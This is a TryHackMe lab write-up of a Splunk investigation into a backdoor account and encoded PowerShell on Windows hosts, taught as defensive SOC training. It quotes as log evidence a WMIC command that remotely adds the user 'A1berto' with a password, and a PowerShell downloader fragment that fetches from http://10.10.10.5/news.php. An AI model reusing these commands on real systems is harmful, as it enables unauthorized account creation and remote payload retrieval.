# Investigating with Splunk

A step-by-step investigation of suspicious Windows activity using Splunk.

- **Platform:** TryHackMe
- **Room:** [Investigating with Splunk](https://tryhackme.com/room/investigatingwithsplunk)
- **Data sources:** Windows Security, Sysmon and PowerShell logs

> Findings are based on the provided training materials. Verify the results in your own lab environment.

## Table of Contents

- [Splunk Basics](#splunk-basics)
- [Notable Investigation](#notable-investigation)
- [Event ID Reference](#event-id-reference)
- [Investigation Scenario](#investigation-scenario)
- [Questions and Investigation Steps](#questions-and-investigation-steps)
- [Timeline and Further Investigation](#timeline-and-further-investigation)
- [SOC Incident Summary](#soc-incident-summary)
- [References](#references)

## Splunk Basics

Splunk is a data analytics platform used to collect, search, analyze and visualize machine data.

**Splunk Enterprise Security** adds SIEM capabilities for security monitoring, threat detection and incident investigation.

| Function | Description |
|---|---|
| Log Management | Centralizes logs from systems, applications and security tools. |
| Search and Analytics | Uses SPL queries to investigate events and related activity. |
| Security Monitoring | Detects suspicious behavior through configured detection rules. |
| Alerting | Generates alerts when defined conditions are met. |
| Visualization | Presents findings through dashboards, charts and reports. |


## Notable Investigation

When investigating a notable in Splunk Enterprise Security:

1. **Read the alert:** Review the description, detection rule and triggering conditions.
2. **Identify the entities:** Record the user, source IP, destination host and time.
3. **Review raw events:** Examine the logs that generated the alert.
4. **Interpret the outcome:** Confirm what `success`, `failure`, `allowed` or `blocked` means in that source.
5. **Correlate activity:** Investigate related events before and after the alert.
6. **Enrich the evidence:** Review reputation, asset context and user behavior.
7. **Document the decision:** Record the evidence and rationale, then close or escalate according to procedure.

> A failed action or clean IP reputation alone does not justify closing an alert.

## Event ID Reference

| Data Source | Event ID | Description |
|---|---:|---|
| Windows Security | 4624 | Successful logon |
| Windows Security | 4625 | Failed logon |
| Windows Security | 4688 | Process creation |
| Windows Security | 4720 | User account creation |
| Sysmon | 1 | Process creation |
| Sysmon | 3 | Network connection |
| Sysmon | 11 | File creation |
| Sysmon | 12 | Registry object creation or deletion |
| Sysmon | 13 | Registry value set |
| Sysmon | 14 | Registry key or value rename |
| PowerShell Operational | 4103 | Module logging |
| PowerShell Operational | 4104 | Script Block Logging |

Always interpret an Event ID together with its provider, log channel and event content.

> Sysmon Event ID 3 records network connections. It is not direct evidence of a user logon.

## Investigation Scenario

SOC Analyst Johny observed anomalous behavior across several Windows hosts. An adversary may have accessed these systems and created a backdoor account.

The collected logs are available in Splunk's `main` index.

Our objectives are to:

- Identify the new account and its registry entry.
- Analyze the remote account creation command.
- Investigate logon attempts.
- Identify suspicious PowerShell activity.
- Decode the web request target.

### Lab Setup

1. Start the room machine.
2. Access Splunk using the assigned IP address.
3. Open **Search & Reporting**.
4. Set the time range to **All time**.
5. Set the search mode to **Verbose**.

> This lab uses fields such as `EventID` and `Hostname`. During your investigation, also review `Image`, `TargetFilename`, `Hashes`, `host`, `source`, `sourcetype`, `Description`, `UtcTime`, `Caller_User_Name`, `TargetUserName`, `TargetLogonId`, `LogonType` and `src_ip`, when available. These fields help identify processes, file paths, hash values, users, systems, log sources, timestamps and authentication activity. Field names and availability vary by data source and configuration. Other environments may use `EventCode`, `Computer` or `ComputerName`. If a field is missing, check the raw event for the relevant information.


## Questions and Investigation Steps

### Q1. How many events were collected and Ingested in the index main?

#### Investigation Goal

Establish the size and scope of the dataset.

#### SPL Query

```spl
index=main
```
<img width="1906" height="259" alt="image" src="https://github.com/user-attachments/assets/5624b1c5-3da6-491e-9e90-e09d4920c028" />

To display the count:

```spl
index=main
| stats count AS total_events
```
<img width="1890" height="283" alt="image" src="https://github.com/user-attachments/assets/0f7fdf07-ad17-49cc-8162-161bc751f37e" />


#### Answer

```text
12256
```

#### SOC Analysis

The index contains **12,256 events**. This represents the dataset size, not the number of malicious events.

Confirm the time range is **All time**.

To review the dataset's time boundaries:

```spl
index=main
| stats count AS total_events
        min(_time) AS first_event
        max(_time) AS last_event
| convert ctime(first_event) ctime(last_event)
```

To identify available sources:

```spl
index=main
| stats count BY sourcetype source
| sort - count
```

---

### Q2. On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?

#### Investigation Goal

Identify account creation activity using Windows Security Event ID **4720**.

#### SPL Query

```spl
index=main EventID=4720
```

If the fields are available:

```spl
index=main EventID=4720
| table _time Hostname SubjectUserName TargetUserName TargetSid
```
<img width="1895" height="263" alt="image" src="https://github.com/user-attachments/assets/5940f185-6f21-4e4c-9eaf-3c2dccc5b329" />

#### Evidence Review

Examine:

- **New Account / TargetUserName:** The created account.
- **Subject / SubjectUserName:** The initiating security context.
- **Hostname:** The system associated with the event.
- **_time:** The event timestamp.
<img width="847" height="470" alt="image" src="https://github.com/user-attachments/assets/09e0b02a-b9fe-48ff-9ba4-60540a388113" />
- **`index=main EventID=4720`**: Finds new user account creation events.
- **`| table _time Hostname SubjectUserName TargetUserName`**: Displays the time, host, initiating user and newly created account in a table.
- **`| sort 0 _time`**: Sorts all results from oldest to newest.
<img width="1910" height="352" alt="image" src="https://github.com/user-attachments/assets/f4a489c3-2b89-4e2e-8455-06d16ec9c047" />

#### Answer

```text
A1berto
```

#### SOC Analysis

The username uses the digit **1** instead of the lowercase letter **l**.

| Legitimate Account | Suspicious Account |
|---|---|
| `Alberto` | `A1berto` |

This similarity supports an attempt to make the new account resemble a legitimate user.

The Subject account identifies the security context of the action. It does not establish that the account's human owner performed the attack.

---

### Q3. On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?

#### Investigation Goal

Find registry activity associated with the new account.

#### SPL Query

```spl
index=main A1berto (EventID=12 OR EventID=13 OR EventID=14)
| table _time Hostname EventID EventType Image TargetObject Details
| sort 0 _time

- **`index=main A1berto (EventID=12 OR EventID=13 OR EventID=14)`**: Finds registry creation, deletion, value modification or rename events containing `A1berto`.
- **`| table _time Hostname EventID EventType Image TargetObject Details`**: Displays the time, host, event ID, event type, process executable, registry path and details.
- **`| sort 0 _time`**: Sorts all results from oldest to newest.
```
<img width="1901" height="412" alt="image" src="https://github.com/user-attachments/assets/ce62054f-c189-4dc1-a969-a2d6e4953f22" />

HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto
<img width="1827" height="412" alt="image" src="https://github.com/user-attachments/assets/11559492-3dbc-46a6-aa84-f86556db5ee8" />

ORRRRR :))

Depending on the log source and field extraction settings, registry information may appear in **`TargetObject`** or **`registry_key_name`**. Compare their values:

```spl
index=main A1berto (EventID=12 OR EventID=13 OR EventID=14)
| table _time EventID TargetObject registry_key_name
```
<img width="1910" height="379" alt="image" src="https://github.com/user-attachments/assets/99ec3fcb-b004-448f-a0db-359a8eb25675" />

A narrower search:

```spl
index=main A1berto EventID=13
```
<img width="1906" height="588" alt="image" src="https://github.com/user-attachments/assets/e1375c9c-3b11-4a64-9c2b-c9088bbb19dd" />

#### Evidence Review

Depending on the log source and field extraction settings, registry information may appear in TargetObject or registry_key_name. Inspect these fields and compare their values.
Compare the hostname and timestamp with the account creation event from Q2 to confirm the registry activity occurred on the same host around the time the account was created.

#### Answer

```text
HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto
```

#### SOC Analysis

This path is associated with the account's entry in the Windows SAM database.

It supports the account creation finding. It does not independently prove that the attacker established a registry autostart persistence mechanism.

---

### Q4. Examine the logs and identify the user that the adversary was trying to impersonate.

#### Investigation Goal

Identify the legitimate account that the new username resembles.

#### SPL Query

```spl
index=main
| stats count BY User
| sort - count
```
<img width="1901" height="427" alt="image" src="https://github.com/user-attachments/assets/b385a1c0-86c6-4b92-a859-74d2fe865a38" />

Alternatively, run:

```spl
index=main
```

Then inspect the **User** field in the field panel.
<img width="1899" height="628" alt="image" src="https://github.com/user-attachments/assets/8e6e4fd9-b546-4a4d-9023-9d97628edc6a" />

#### Answer

```text
Alberto
```

#### SOC Analysis

The suspicious account `A1berto` resembles the legitimate account `Alberto`.

This supports username imitation. It does not prove credential theft, token impersonation or compromise of the legitimate account.

---

### Q5. What is the command used to add a backdoor user from a remote computer?

#### Investigation Goal

Identify the command through process creation events:

- **Sysmon Event ID 1**
- **Windows Security Event ID 4688**

#### SPL Query

```spl
index=main A1berto (EventID=1 OR EventID=4688)
| table _time Hostname EventID User Image ParentImage CommandLine
| sort 0 _time
```
<img width="1895" height="646" alt="image" src="https://github.com/user-attachments/assets/4c0822fb-4ef6-44f0-8d85-23894be972af" />

#### Evidence Review

Inspect **CommandLine** for `WMIC.exe` and `net user`.

#### Answer

```text
"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
```

> Analyze this command as log evidence. Running it is not required for the investigation.

#### Command Breakdown

| Component | Meaning |
|---|---|
| `WMIC.exe` | Tool used to perform WMI operations |
| `/node:WORKSTATION6` | Remote target host |
| `process call create` | Request to create a process on the target |
| `net user /add` | User account creation |
| `A1berto` | New username |
| `paw0rd1` | Password shown in the command |

#### SOC Analysis

The command targets `WORKSTATION6` and requests creation of the new account.

Distinguish the host where the command was logged from the remote target specified by `/node:`.

The process creation event records command execution. Correlate it with Event ID 4720 to support successful account creation.

---

### Q6. How many times was the login attempt from the backdoor user observed during the investigation?

#### Investigation Goal

Determine whether the new account appears in successful or failed logon events.

#### SPL Query

```spl
index=main A1berto (EventID=4624 OR EventID=4625)
| stats count AS observed_logon_events
```
- **`index=main A1berto (EventID=4624 OR EventID=4625)`**: Finds successful (`4624`) and failed (`4625`) logon events containing `A1berto`.
- **`| stats count AS observed_logon_events`**: Counts matching events and displays the total as `observed_logon_events`.
  
<img width="1909" height="288" alt="image" src="https://github.com/user-attachments/assets/332abf36-85bc-4a27-bc50-8bef52b27046" />

Alternatively, run:

```spl
index=main User="A1berto"
```

<img width="1898" height="234" alt="image" src="https://github.com/user-attachments/assets/ff72bac3-8e3b-4de3-9ddb-3b7697c6aae3" />

#### Answer

```text
0
```

#### SOC Analysis

No successful or failed logon event for `A1berto` was observed in the available dataset.

This does not prove the account was never used. Log coverage, retention and auditing settings limit the conclusion.

A search for `User="A1berto"` alone is insufficient because account information may appear in a different field or domain-qualified format.

---

### Q7. What is the name of the infected host on which suspicious Powershell commands were executed?

#### Investigation Goal

Identify the host associated with the PowerShell activity.

#### SPL Query

```spl
index=main powershell
| stats count BY Hostname
| sort - count
```
<img width="1910" height="330" alt="image" src="https://github.com/user-attachments/assets/8333bfed-97f7-4e0b-9380-c60e61d57172" />

To focus on PowerShell logging events:

```spl
index=main (EventID=4103 OR EventID=4104)
| stats count BY Hostname
| sort - count
```
<img width="1906" height="335" alt="image" src="https://github.com/user-attachments/assets/155ec60b-71a1-4741-8bdf-fdf28f27f12b" />

#### Answer

```text
James.browne
```

#### SOC Analysis

In this lab, `James.browne` is a value in the **Hostname** field.

Do not assume Splunk's `host` metadata field always identifies the endpoint where an event occurred. Verify it against the event content.

PowerShell usage alone is not malicious. Evaluate the encoded command, script behavior and related activity.

---

### Q8. PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?

#### Compare PowerShell Logging Event Types

This query counts PowerShell module logging (`4103`) and script block logging (`4104`) events by hostname and event type.

```spl
index=main (EventID=4103 OR EventID=4104)
| stats count BY Hostname EventID
| sort - count
```
<img width="1906" height="318" alt="PowerShell logging search results" src="https://github.com/user-attachments/assets/38722508-129a-44b5-87f7-8aaa2a54fd0e" />

#### Answer

```text
79
```

The dataset contains **79 PowerShell logging events**. This count represents log records, not necessarily 79 separate PowerShell executions.

#### SOC Analysis

The result represents **79 event records**.

A single PowerShell execution can generate multiple logging events. This count does not establish 79 separate commands, processes or attacks.

- **4103:** Module logging.
- **4104:** Script Block Logging.
- **Transcription:** A separate logging feature.

---

### Q9. An encoded Powershell script from the infected host initiated a web request. What is the full URL?

#### Investigation Goal

Extract the encoded PowerShell command and identify its web request target.

#### Step 1: Extract the Command

```spl
index=main PowerShell
```
<img width="1931" height="787" alt="image" src="https://github.com/user-attachments/assets/f60ca1bb-ed6c-407d-bcfb-a42c5176a12a" />

#### Step 2: Decode the First Layer

Open [CyberChef](https://gchq.github.io/CyberChef/) and apply:

1. **From Base64**
2. **Decode text**
3. Encoding: **UTF-16LE**

PowerShell's `-EncodedCommand` parameter uses a Base64 representation of UTF-16LE text.

> Base64 is encoding, not hashing or encryption. Review decoded content as text without executing it.
<img width="1907" height="990" alt="image" src="https://github.com/user-attachments/assets/3d6dff4f-d350-4c84-b178-e11bf5000ae9" />

#### Step 4: Locate the Inner Base64 Value

The decoded script contains:

```powershell
$ser=$([Text.Encoding]::Unicode.GetString(
[Convert]::FromBase64String(
'aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA=='
)));
$t='/news.php'
```

Decode the inner value:

```text
aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==
```

Use the same CyberChef recipe:

```text
From Base64
Decode text: UTF-16LE
```

Output:

```text
http://10.10.10.5
```
<img width="1916" height="668" alt="image" src="https://github.com/user-attachments/assets/79cad2ed-a6a7-4996-bd66-32ac6fac47e8" />

#### Step 5: Assemble the URL

The path is:

```powershell
$t='/news.php'
```
<img width="950" height="378" alt="image" src="https://github.com/user-attachments/assets/97f2984f-c7f6-463b-bb05-7d3b4a09078f" />

The script uses:

```powershell
DownloadData($ser+$t)
```

Combining the server address and path gives:

```text
http://10.10.10.5/news.php
```

#### Step 6: Defang the URL

Apply CyberChef's **Defang URL** operation.

#### Answer

```text
hxxp[://]10[.]10[.]10[.]5/news[.]php
```
<img width="1908" height="995" alt="image" src="https://github.com/user-attachments/assets/f34e3c9f-750a-4bcf-b530-dc7004a268ae" />

#### SOC Analysis

The script contains code intended to download data from this address.

Script content alone does not prove:

- A successful connection.
- A completed download.
- Execution of downloaded content.
- A confirmed command-and-control channel.

Validate these conclusions using network and endpoint telemetry.

`10.10.10.5` is a private IP address and should not be described as an external internet destination.

## References

- [TryHackMe — Investigating with Splunk](https://tryhackme.com/room/investigatingwithsplunk)
- [Microsoft — Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Microsoft — PowerShell Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1)
- [CyberChef](https://gchq.github.io/CyberChef/)
- User-provided PDF: `investigation with Splunk PDF.pdf`
- User-provided walkthroughs by jcm3, igor_sec, Enes Cayvarli, Matt Eaton and B_the_Ripper











































